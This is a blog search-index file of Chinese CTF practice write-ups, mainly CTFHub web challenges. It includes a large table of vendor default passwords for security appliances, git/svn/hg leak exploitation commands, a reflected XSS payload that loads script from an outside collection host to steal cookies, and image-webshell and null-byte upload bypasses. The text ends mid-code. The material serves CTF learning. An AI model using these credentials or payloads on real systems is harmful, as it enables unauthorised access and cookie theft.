<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AWD比赛记录</title>
    <url>/2022/12/13/AWD/</url>
    <content><![CDATA[<p><strong><code>awd感觉时刻处于地狱，一不注意就被拿分，还被cheak狠狠的扣分</code></strong></p>
<span id="more"></span>

<h1 id="2022安洵杯决赛AWD"><a href="#2022安洵杯决赛AWD" class="headerlink" title="2022安洵杯决赛AWD"></a>2022安洵杯决赛AWD</h1>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFHub-wp</title>
    <url>/2022/07/27/CTFHub-wp/</url>
    <content><![CDATA[<p><code>做做笔记</code></p>
<span id="more"></span>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-密码口令"><a href="#1-密码口令" class="headerlink" title="1.密码口令"></a>1.密码口令</h2><h3 id="1）弱口令"><a href="#1）弱口令" class="headerlink" title="1）弱口令"></a>1）弱口令</h3><p>一般思维，</p>
<p>用户名：admin，root</p>
<p>密码：password，admin123，123456</p>
<p>可以用<strong>top100字典</strong>（可以网上找一下）跑一下，但有的可能需要<strong>枚举法</strong></p>
<p>比如<strong>admin888</strong>或者<strong>admin255</strong>这样的类似的，就需要在后面用枚举法找出，字典并没包含这种类似情况</p>
<h3 id="2）默认口令"><a href="#2）默认口令" class="headerlink" title="2）默认口令"></a>2）默认口令</h3><p>就是系统默认的口令，在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">常见网络安全设备弱口令(默认口令)</span><br><span class="line">设备    默认账号    默认密码</span><br><span class="line">深信服产品    sangfor    sangfor sangfor@<span class="number">2018</span> sangfor@<span class="number">2019</span></span><br><span class="line">深信服科技 AD        dlanrecover</span><br><span class="line">深信服负载均衡 AD <span class="number">3.6</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服WAC ( WNS V2<span class="number">.6</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服VPN    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">深信服ipsec-VPN (SSL <span class="number">5.5</span>)    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">深信服AC6<span class="number">.0</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">SANGFOR防火墙    <span class="keyword">admin</span>    sangfor</span><br><span class="line">深信服AF(NGAF V2<span class="number">.2</span>)    <span class="keyword">admin</span>    sangfor</span><br><span class="line">深信服NGAF下一代应用防火墙(NGAF V4<span class="number">.3</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服AD3<span class="number">.9</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服上网行为管理设备数据中心    <span class="keyword">Admin</span>    密码为空</span><br><span class="line">SANGFOR_AD_v5<span class="number">.1</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">网御漏洞扫描系统    leadsec    leadsec</span><br><span class="line">天阗入侵检测与管理系统 V7<span class="number">.0</span>    <span class="keyword">Admin</span>    venus70</span><br><span class="line">Audit    venus70</span><br><span class="line">adm    venus70</span><br><span class="line">天阗入侵检测与管理系统 V6<span class="number">.0</span>    <span class="keyword">Admin</span>    venus60</span><br><span class="line">Audit    venus60</span><br><span class="line">adm    venus60</span><br><span class="line">网御WAF集中控制中心(V3<span class="number">.0</span>R5<span class="number">.0</span>)    <span class="keyword">admin</span>    leadsec.waf</span><br><span class="line">audit    leadsec.waf</span><br><span class="line">adm    leadsec.waf</span><br><span class="line">联想网御    administrator    administrator</span><br><span class="line">网御事件服务器    <span class="keyword">admin</span>    admin123</span><br><span class="line">联想网御防火墙PowerV    administrator    administrator</span><br><span class="line">联想网御入侵检测系统    lenovo    <span class="keyword">default</span></span><br><span class="line">网络卫士入侵检测系统    <span class="keyword">admin</span>    talent</span><br><span class="line">网御入侵检测系统V3<span class="number">.2</span><span class="number">.72</span><span class="number">.0</span>    adm    leadsec32</span><br><span class="line"><span class="keyword">admin</span>    leadsec32</span><br><span class="line">联想网御入侵检测系统IDS    root    <span class="number">111111</span></span><br><span class="line"><span class="keyword">admin</span>    admin123</span><br><span class="line">科来网络回溯分析系统    csadmin    colasoft</span><br><span class="line">中控考勤机web3<span class="number">.0</span>    administrator    <span class="number">123456</span></span><br><span class="line">H3C iMC    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C SecPath系列    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C S5120-SI    test    <span class="number">123</span></span><br><span class="line">H3C智能管理中心    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C ER3100    <span class="keyword">admin</span>    adminer3100</span><br><span class="line">H3C ER3200    <span class="keyword">admin</span>    adminer3200</span><br><span class="line">H3C ER3260    <span class="keyword">admin</span>    adminer3260</span><br><span class="line">H3C    <span class="keyword">admin</span>    adminer</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    h3capadmin</span><br><span class="line">h3c    h3c</span><br><span class="line"><span class="number">360</span>天擎    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">网神防火墙    firewall    firewall</span><br><span class="line">天融信防火墙NGFW4000    superman    talent</span><br><span class="line">黑盾防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">rule</span>    abc123</span><br><span class="line">audit    abc123</span><br><span class="line">华为防火墙    telnetuser    telnetpwd</span><br><span class="line">ftpuser    ftppwd</span><br><span class="line">方正防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">飞塔防火墙    <span class="keyword">admin</span>    密码为空</span><br><span class="line">Juniper_SSG__5防火墙    netscreen    netscreen</span><br><span class="line">中新金盾硬件防火墙    <span class="keyword">admin</span>    <span class="number">123</span></span><br><span class="line">kill防火墙(冠群金辰)    <span class="keyword">admin</span>    sys123</span><br><span class="line">天清汉马USG防火墙    <span class="keyword">admin</span>    venus.fw</span><br><span class="line">Audit    venus.audit</span><br><span class="line">useradmin    venus.<span class="keyword">user</span></span><br><span class="line">阿姆瑞特防火墙    <span class="keyword">admin</span>    manager</span><br><span class="line">山石网科    hillstone    hillstone</span><br><span class="line">绿盟安全审计系统    weboper    weboper</span><br><span class="line">webaudit    webaudit</span><br><span class="line">conadmin    conadmin</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">shell    shell</span><br><span class="line">绿盟产品        nsfocus123</span><br><span class="line">TopAudit日志审计系统    superman    talent</span><br><span class="line">LogBase日志管理综合审计系统    <span class="keyword">admin</span>    safetybase</span><br><span class="line">网神SecFox运维安全管理与审计系统    <span class="keyword">admin</span>    !<span class="number">1</span>fw@<span class="number">2</span>soc#<span class="number">3</span>vpn</span><br><span class="line">天融信数据库审计系统    superman    telent</span><br><span class="line">Hillstone安全审计平台    hillstone    hillstone</span><br><span class="line">网康日志中心    ns25000    ns25000</span><br><span class="line">网络安全审计系统（中科新业）    <span class="keyword">admin</span>    <span class="number">123456</span></span><br><span class="line">天玥网络安全审计系统    <span class="keyword">Admin</span>    cyberaudit</span><br><span class="line">明御WEB应用防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    adminadmin</span><br><span class="line">明御攻防实验室平台    root    <span class="number">123456</span></span><br><span class="line">明御安全网关    <span class="keyword">admin</span>    adminadmin</span><br><span class="line">明御运维审计与册风险控制系统    <span class="keyword">admin</span>    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">system</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">auditor    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">operator</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">明御网站卫士    sysmanager    sysmanager888</span><br><span class="line">亿邮邮件网关    eyouuser    eyou_admin</span><br><span class="line">eyougw    <span class="keyword">admin</span>@(eyou)</span><br><span class="line"><span class="keyword">admin</span>    +-ccccc</span><br><span class="line"><span class="keyword">admin</span>    cyouadmin</span><br><span class="line">Websense邮件安全网关    administrator    <span class="keyword">admin</span></span><br><span class="line">梭子鱼邮件存储网关    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>

<h2 id="2-信息泄露-备份文件下载"><a href="#2-信息泄露-备份文件下载" class="headerlink" title="2.信息泄露-备份文件下载"></a>2.信息泄露-备份文件下载</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220919213733369.png" alt="image-20220919213733369"></p>
<h2 id="2-1-信息泄露-robots-txt"><a href="#2-1-信息泄露-robots-txt" class="headerlink" title="2.1 信息泄露-robots.txt"></a>2.1 信息泄露-robots.txt</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">访问url/robots.txt</span><br></pre></td></tr></table></figure>

<p>查看爬虫协议</p>
<h2 id="2-2-信息泄露-bak文件"><a href="#2-2-信息泄露-bak文件" class="headerlink" title="2.2 信息泄露-bak文件"></a>2.2 信息泄露-bak文件</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">访问url/文件名.后缀名<span class="string">.bak</span></span><br></pre></td></tr></table></figure>

<p>下载bak（备份文件）</p>
<h2 id="2-3-信息泄露-vim缓存"><a href="#2-3-信息泄露-vim缓存" class="headerlink" title="2.3 信息泄露-vim缓存"></a>2.3 信息泄露-vim缓存</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用<code>vim</code>时会创建临时缓存文件，关闭<code>vim</code>时缓存文件则会被删除，当<code>vim</code>异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 <code>index.php</code> 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>
<p><strong>再次意外退出</strong>后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
<p><strong>第三次产生</strong>的交换文件则为 <code>.index.php.swn</code><br>作用</p>
<p><u>可用来恢复意外退出的文件</u></p>
<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p><code>SWP</code>文件为隐藏文件，操作时需要在文件名前加.</p>
<p>针对<code>SWP</code>备份文件，我们可以使用<code>vim -r filename</code>命令来恢复文件<br>(<code>vim</code>使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留,所以显示是一种乱码)<br>根据提示按回车进行恢复</p>
<h2 id="2-4-信息泄露-DS-Store"><a href="#2-4-信息泄露-DS-Store" class="headerlink" title="2.4 信息泄露-.DS_Store"></a>2.4 信息泄露-.DS_Store</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">.DS_Store</span> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过<span class="string">.DS_Store</span>可以知道这个目录里面所有文件的清单。</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">访问url/.DS_Store</span><br></pre></td></tr></table></figure>

<p>下载<code>DS_Store</code>文件</p>
<h2 id="3-信息泄露-Git泄露-log"><a href="#3-信息泄露-Git泄露-log" class="headerlink" title="3.信息泄露-Git泄露-log"></a>3.信息泄露-Git泄露-log</h2><p> 第一次使用<strong>githack</strong>，记录一下</p>
<p><strong>注意githack需要python2.7版本</strong></p>
<p><code>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</code></p>
<p><code>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</code></p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>1、解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去<code>.git/objects/</code> 文件夹下下载对应的文件<br>3、<code>zlib</code>解压文件，按原始的目录结构写入源代码</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，<code>all you need is python</code><br>脚本无需浏览目录</p>
<h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GitHack.py http:<span class="regexp">//</span>www.openssl.org<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure>

<p>然后在目录<code>dist</code>就会生成对应目录 </p>
<p>打开目录，输入<code>cmd</code>，执行<code>git log</code>【<code>git log</code> 可以查看<code>commit history</code>，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220728230330073.png" alt="image-20220728230330073"></p>
<p>然后复制<code>add flag</code>这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
<p>然后用<code>git diff</code></p>
<p>【</p>
<p>git diff比较两个版本的差异，</p>
<p>这里后面只有<strong>一个命令</strong>就是比较本地工作区和缓存区的信息区别</p>
<p>如果后面有<strong>两个命令</strong>，就是比较这两个命令的差别</p>
<p>】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220728231134513.png" alt="image-20220728231134513"></p>
<p>这里比较，就得到了<code>flag</code></p>
<h2 id="4-信息泄露-Git泄露-Stash"><a href="#4-信息泄露-Git泄露-Stash" class="headerlink" title="4.信息泄露-Git泄露-Stash"></a>4.信息泄露-Git泄露-Stash</h2><h3 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h3><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u><code>git stash</code>等同于<code>git stash save.</code></u></p>
<p>最新的存储保存在<code>refs/stash</code>中老的存储可以通过相关的参数获得,例如<code>stash@&#123;0&#125;</code>获取最新的存储,stash@{1}获取次新<code>.stash@&#123;2.hour.ago&#125;</code>获取两小时之前的.存储可以直接通过索引的位置来获得<code>stash@&#123;n&#125;</code>.</p>
<p>操作同<code>2.log</code></p>
<p>可以先用<code>dirsearch</code>扫一下， 发现<code>refs/stash</code>文件，</p>
<p>然后用<code>GitHack</code>扫描</p>
<p>在生成文件夹里有<code>stash</code>文件</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">`D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs`</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/27/CTFHub-wp/image-20220729115457869.png" alt="image-20220729115457869"></p>
<p>打开看到</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729115528299.png" alt="image-20220729115528299"></p>
<p>在生成的文件夹下用</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">git diff d8c1978b1e71300574e1bb5335a01<span class="number">124b3a55569</span></span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p>【也可以使用 <code>git bash</code>，直接在生成的文件夹下</p>
<p>执行<code>git stash list</code> </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">查看stash了哪些存储</span><br></pre></td></tr></table></figure>

<p>然后执行<code>git stash pop</code></p>
<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，
并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，

如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，
比如应用并删除第二个：git stash pop stash@&#123;1&#125;）
</code></pre>
<p>然后会在该目录下生成一个新的<code>txt</code>文件，打开或用<code>cat</code>命令，得到<code>flag</code></p>
<p>】</p>
<h2 id="5-信息泄露-SVN泄露"><a href="#5-信息泄露-SVN泄露" class="headerlink" title="5.信息泄露-SVN泄露"></a>5.信息泄露-SVN泄露</h2><p><code>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</code></p>
<p>这道题需要运用<code>dvcs-ripper</code>工具进行处理</p>
<p>可以先用<code>dirsearch</code>扫出<code>.svn</code>目录，说明有<code>SVN</code>泄露</p>
<p>和<code>githack</code>类似，</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-svn.pl -v -u url/</span>.svn</span><br></pre></td></tr></table></figure>

<p>然后在dvcs-ripper目录里，进入.svn目录</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175208298.png" alt="image-20220729175208298"></p>
<p>然后进入pristine目录，进去发现两个目录，挨个打开</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175252045.png" alt="image-20220729175252045"></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175429878.png" alt="image-20220729175429878"></p>
<p>发现一个目录下是网站页面源码，另一个就是<code>flag</code></p>
<p>得到<code>flag</code></p>
<h2 id="6-信息泄露-HG泄露"><a href="#6-信息泄露-HG泄露" class="headerlink" title="6.信息泄露-HG泄露"></a>6.信息泄露-HG泄露</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="string">`当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。`</span></span><br></pre></td></tr></table></figure>

<p>可以先用<code>dirsearch</code>扫出<code>.hg</code>目录，说明有<code>HG</code>泄露</p>
<p>这个和<code>SVN</code>一样，只不过要改成<code>.hg</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-hg.pl -v -u url/</span>.hg</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/27/CTFHub-wp/image-20220730164340016.png" alt="image-20220730164340016"></p>
<p>发现两个文件，猜测为<code>HG</code>泄露文件</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220730164428184.png" alt="image-20220730164428184"></p>
<p>发现<code>flag</code>文本文件</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220730164949862.png" alt="image-20220730164949862"></p>
<p><code>url+flag_973127138.txt</code></p>
<p>得到<code>flag</code></p>
<h2 id="7-xss-xss反射型"><a href="#7-xss-xss反射型" class="headerlink" title="7.xss-xss反射型"></a>7.xss-xss反射型</h2><p>发现它有两个输入框</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731104635854.png" alt="image-20220731104635854"></p>
<p>第一个输入测试语句，成功弹窗</p>
<p>第二个是发送<code>url</code>，盲猜是发到后台</p>
<p>看了一些<code>wp</code>，发现需要使用<code>xss</code>测试平台<code>http://xsscom.com//index.php</code></p>
<p>先创建项目</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113619175.png" alt="image-20220731113619175"></p>
<p>设置配置</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113753893.png" alt="image-20220731113753893"></p>
<p>然后点击查看代码</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113810045.png" alt="image-20220731113810045"></p>
<p>在最下面看到</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113837566.png" alt="image-20220731113837566"></p>
<p>把代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xsscom.com//9VJcMV</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入到第一个框中</p>
<p>再把提交后的url复制，然后到第二框中发送</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731114028909.png" alt="image-20220731114028909"></p>
<p>然后返回xss测试平台上查看</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731114142138.png" alt="image-20220731114142138"></p>
<p><code>cookie</code>处出现<code>flag</code></p>
<h2 id="8-文件上传-文件头检查"><a href="#8-文件上传-文件头检查" class="headerlink" title="8.文件上传-文件头检查"></a>8.文件上传-文件头检查</h2><p><code>文件头是直接位于文件中的一段数据,是文件的一部分</code></p>
<p>这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164210465.png" alt="image-20220731164210465"></p>
<p>上传图片后，在后面加上一句话木马，并修改文件名</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">【也可以用<span class="keyword">cmd</span><span class="language-bash"> 合成图片马，也是有图片文件头】</span></span><br><span class="line"></span><br><span class="line">【<span class="keyword">copy</span><span class="language-bash"> 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】</span></span><br><span class="line"></span><br><span class="line">【已试可行】</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/27/CTFHub-wp/image-20220731164732820.png" alt="image-20220731164732820"></p>
<p>然后正常用蚁剑连接</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164330254.png" alt="image-20220731164330254"></p>
<p>得到<code>flag</code></p>
<h2 id="9-文件上传-00截断"><a href="#9-文件上传-00截断" class="headerlink" title="9.文件上传-00截断"></a>9.文件上传-00截断</h2><h3 id="0x00截断原理：-php-lt-5-3-29"><a href="#0x00截断原理：-php-lt-5-3-29" class="headerlink" title="0x00截断原理：[php&lt;5.3.29]"></a>0x00截断原理：[php&lt;5.3.29]</h3><figure class="highlight cos"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x00是十六进制表示方法，是<span class="keyword">ascii</span>码为<span class="number">0</span>的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到<span class="number">0</span>x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。</span><br><span class="line"></span><br><span class="line">但要注意是文件的<span class="number">16</span>进制内容里的<span class="number">00</span>，而不是文件名中的<span class="number">00</span> ！！！就是说系统是按<span class="number">16</span>进制读取文件（或者说二进制），</span><br><span class="line"></span><br><span class="line">遇到<span class="keyword">ascii</span>码为零的位置就停止，而这个<span class="keyword">ascii</span>码为零的位置在<span class="number">16</span>进制中是<span class="number">00</span>，用<span class="number">0</span><span class="keyword">x</span>开头表示<span class="number">16</span>进制，也就是所说的<span class="number">0</span>x00截断。</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span>是被服务器解码为<span class="number">0</span>x00发挥了截断作用。</span><br></pre></td></tr></table></figure>

<p><code>举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。</code></p>
<p>我们开始先上传一个文件试试，限制<code>jpg,png,gif</code>后缀</p>
<p>上传成功后，没有显示上传路径，只是url变化</p>
<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
<p> 猜想多半重新临时文件名，不固定，导致显示不了路径</p>
<p>这里就需要<code>00截断</code>，要把文件上传的路径，找到，好用蚁剑连接</p>
<p>先要清楚<code>%00</code>截断点在哪里，我们先F12看</p>
<p>看网站源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;文件类型不匹配&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现里面有一串代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span 